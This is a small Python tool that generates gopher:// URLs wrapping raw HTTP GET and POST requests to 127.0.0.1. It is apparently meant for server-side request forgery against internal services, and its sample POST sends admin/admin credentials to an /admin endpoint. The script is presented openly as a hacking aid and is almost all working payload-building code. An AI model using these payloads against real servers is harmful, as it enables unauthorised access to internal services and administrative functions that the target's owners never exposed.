#
# Gopher HTTP requests (POST/GET) | By: Liquidsky
#
# URL: gopher: // <host>:<port>/<gopher-path>_ followed by TCP data stream
#
# Be careful not to forget the underscore "_" at the end. The TCP data stream begins after the underscore "_". If you do not add this "_", the message received by the server will not be complete. You can write this character at will.
#
# Tip for determing POST request length:
#
#└─$ echo "username=admin&password=admin" | wc -c 
# Output= 30
# Subtract 1 from this result. = 29 -> Then add this to content length header.
#

import urllib.parse

# The GET and POST request will be modified to match the target site.
# Get request Gopher payload -> Make sure you update the GET request
GETrequest = \
"""GET / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
"""

# POST request Gopher payload -> Make sure you update the POST request
POSTrequest = \
"""POST /admin HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
"""

ans=True
while ans:
    print ("""
    1. Gopher GET Request
    2. Gopher POST Request
    """)
    ans=input("[*] Please select GET (1) or POST (2) request: ")
    if ans=="1":
      print("[x] Gopher GET Request: ")

      tmp = urllib.parse. quote(GETrequest)
      new = tmp.replace('%0A','%0D%0A' )
      result = 'gopher://localhost:80/'+'_'+ new
      print (result)
      print
      print ("[!] Happy Hacking ^_~")

    elif ans=="2":
      print("[?] Informational: The four HTTP headers above are required for POST requests, namely POST, Host, Content-Type and Content-Length. If it is missing, an error will be reported, but GET does not use it.")
      print("[x] Gopher POST Request: ")
      tmp = urllib.parse. quote(POSTrequest)
      new = tmp.replace('%0A','%0D%0A' )
      result = 'gopher://127.0.0.1:80/'+'_'+ new
      print (result)
      print
      print ("[!] Happy Hacking ^_~")
    elif ans !="":
      print("[!] Not Valid Choice Try again")
      print("[?] Press CTRL+C or Enter to exit")
